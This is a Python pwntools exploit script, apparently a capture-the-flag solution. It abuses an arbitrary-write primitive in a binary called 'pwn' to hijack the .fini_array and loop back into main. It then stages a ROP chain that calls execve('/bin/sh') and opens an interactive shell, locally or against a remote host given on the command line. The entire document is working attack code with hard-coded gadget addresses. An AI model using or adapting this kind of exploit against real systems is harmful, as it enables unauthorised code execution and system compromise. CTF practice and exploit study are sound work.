#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def write(addr, content):
    p.sa('addr:', str(addr))
    p.sa('data:', content)

if __name__ == '__main__':
    fini_array_addr = 0x00000000004B40F0
    main_addr = 0x0000000000401B6D
    call_addr = 0x0000000000402960
    write(fini_array_addr, flat(call_addr, main_addr))
    stage_addr = 0x00000000004b40f0 + 0x10
    syscall_addr = 0x00000000004022b4
    pop_rdi_addr = 0x0000000000401696
    pop_rdx_rsi_addr = 0x000000000044a309
    pop_rax_addr = 0x000000000041e4af
    bin_sh = 0x68732f6e69622f
    bin_sh_addr = 0x4b4140
    leave_ret = 0x0000000000401c4b
    write(stage_addr, flat(pop_rdi_addr, bin_sh_addr, pop_rdx_rsi_addr))
    write(stage_addr + 0x18, flat(0x0, 0x0, pop_rax_addr))
    write(stage_addr + 0x30, flat(0x3b, syscall_addr, bin_sh))
    #gogogo('x /20gx %s' % hex(stage_addr))
    bc(syscall_addr)
    write(fini_array_addr, flat(leave_ret))
    p.i()
